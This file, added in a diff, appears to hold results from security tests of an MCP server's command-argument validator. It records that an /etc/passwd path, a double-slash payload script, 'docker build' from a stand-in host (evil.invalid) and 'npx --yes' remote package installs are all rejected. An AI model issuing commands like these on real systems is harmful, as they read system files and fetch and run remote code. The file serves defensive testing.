@@ -1,0 +1,42 @@
+{
+  "validation": "accepted",
+  "validation_error": null,
+  "negative_control": "rejected",
+  "negative_control_error": "Argument contains potential local file access: \"/etc/passwd\"",
+  "toolkit_error": null,
+  "tools": [
+    "ghsa_echo"
+  ],
+  "tool_call_result": "[{\"type\":\"text\",\"text\":\"ghsa-benign-round-trip\"}]",
+  "bypass_assertions": [
+    {
+      "id": "rce_local_file_via_double_slash",
+      "command": "node",
+      "args": [
+        "//lab/fixtures/mcp_payload.js"
+      ],
+      "allowed": false,
+      "error": "Argument contains potential local file access: \"//lab/fixtures/mcp_payload.js\""
+    },
+    {
+      "id": "docker_build_remote_context",
+      "command": "docker",
+      "args": [
+        "build",
+        "https://evil.invalid/"
+      ],
+      "allowed": false,
+      "error": "Argument 'build' is not allowed for command 'docker'."
+    },
+    {
+      "id": "npx_yes_remote_package",
+      "command": "npx",
+      "args": [
+        "--yes",
+        "ghsa-mcp-nonexistent-package"
+      ],
+      "allowed": false,
+      "error": "Argument '--yes' is not allowed for command 'npx'."
+    }
+  ]
+}
